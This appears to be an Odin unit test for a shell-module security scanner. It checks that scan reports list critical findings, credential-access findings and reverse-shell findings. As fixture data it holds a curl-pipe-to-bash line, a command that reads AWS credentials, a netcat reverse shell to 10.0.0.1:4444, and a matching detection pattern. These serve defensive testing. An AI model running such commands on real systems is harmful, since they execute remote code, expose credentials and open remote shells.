package test

import "core:strings"
import "core:testing"

import "../src/security"

@(test)
test_scan_result_report_includes_phase2_fields :: proc(t: ^testing.T) {
	result := security.Scan_Result{success = true}

	critical_pattern := security.Pattern{
		severity    = .Critical,
		pattern     = "curl.*\\|.*bash",
		description = "Download and execute via curl",
	}
	warning_pattern := security.Pattern{
		severity    = .Warning,
		pattern     = "curl http://",
		description = "Insecure HTTP download",
	}

	append(&result.findings, security.Finding{
		pattern     = critical_pattern,
		severity    = .Critical,
		file_path   = "install.sh",
		line_number = 12,
		line_text   = "curl http://example.com | bash",
	})
	append(&result.findings, security.Finding{
		pattern     = warning_pattern,
		severity    = .Warning,
		file_path   = "setup.sh",
		line_number = 5,
		line_text   = "curl http://example.com",
	})

	append(&result.credential_findings, security.Credential_Finding{
		file_path        = "init.zsh",
		line_number      = 3,
		credential_type  = .AWS,
		line_text        = "cat ~/.aws/credentials",
		has_exfiltration = false,
	})
	append(&result.reverse_shell_findings, security.Reverse_Shell_Finding{
		file_path   = "shell.zsh",
		line_number = 7,
		shell_type  = .Netcat,
		line_text   = "nc -e /bin/sh 10.0.0.1 4444",
	})

	result.critical_count = 1
	result.warning_count = 1
	result.info_count = 0
	result.trusted_module_applied = true

	report := security.format_scan_report(&result, "demo-module")
	defer delete(report)

	testing.expect(t, strings.contains(report, "Summary:"), "report should include summary")
	testing.expect(t, strings.contains(report, "Trusted module allowlist applied."), "report should include trusted module indicator")
	testing.expect(t, strings.contains(report, "CREDENTIAL ACCESS:"), "report should include credential findings section")
	testing.expect(t, strings.contains(report, "REVERSE SHELLS:"), "report should include reverse shell findings section")

	json_report := security.format_scan_report_json(&result, "https://example.com/demo", "deadbeef")
	defer delete(json_report)
	testing.expect(t, strings.contains(json_report, "\"credential_findings\":1"), "json should include credential count")
	testing.expect(t, strings.contains(json_report, "\"reverse_shell_findings\":1"), "json should include reverse shell count")
	testing.expect(t, strings.contains(json_report, "\"trusted_module_applied\":true"), "json should include trusted module indicator")
}
